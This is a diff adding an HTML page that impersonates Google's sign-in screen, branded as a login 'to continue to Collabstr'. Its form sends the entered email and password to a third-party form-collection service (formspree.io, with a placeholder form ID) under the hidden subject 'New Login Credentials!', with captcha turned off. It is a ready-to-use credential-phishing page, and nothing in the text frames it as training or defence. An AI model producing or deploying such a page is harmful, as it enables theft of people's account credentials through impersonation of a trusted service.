@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .container{max-width:400px;width:100%}
+        .logo-img{width:75px;display:block;margin:0 auto 20px}
+        h1{font-size:24px;text-align:center;font-weight:400;color:#202124;margin-bottom:6px}
+        .subtitle{text-align:center;color:#5f6368;font-size:14px;margin-bottom:30px}
+        .input-group{margin-bottom:16px}
+        .input-group label{display:block;font-size:13px;color:#5f6368;margin-bottom:6px}
+        .input-group input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:8px;font-size:16px;outline:none}
+        .input-group input:focus{border-color:#1a73e8}
+        .next-btn{width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:50px;font-size:15px;cursor:pointer;margin-top:20px}
+        .next-btn:hover{background:#1765cc}
+        .footer{text-align:center;margin-top:32px;color:#5f6368;font-size:12px}
+        .footer a{color:#1a73e8;text-decoration:none;margin:0 4px}
+        .branding{text-align:center;color:#9aa0a6;font-size:11px;margin-top:40px}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo-img" alt="Google">
+        <h1>Sign in with Google</h1>
+        <div class="subtitle">to continue to Collabstr</div>
+        <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST">
+            <input type="hidden" name="_subject" value="🔑 New Login Credentials!">
+            <input type="hidden" name="_captcha" value="false">
+            <div class="input-group">
+                <label>Email or phone</label>
+                <input type="email" name="email" placeholder="you@gmail.com" required>
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="next-btn">Sign in</button>
+        </form>
+        <div class="footer"><a href="#">Help</a> · <a href="#">Privacy</a> · <a href="#">Terms</a></div>
+        <div class="branding">Not your device? Use Guest mode to sign in privately.</div>
+    </div>
+</body>
+</html>
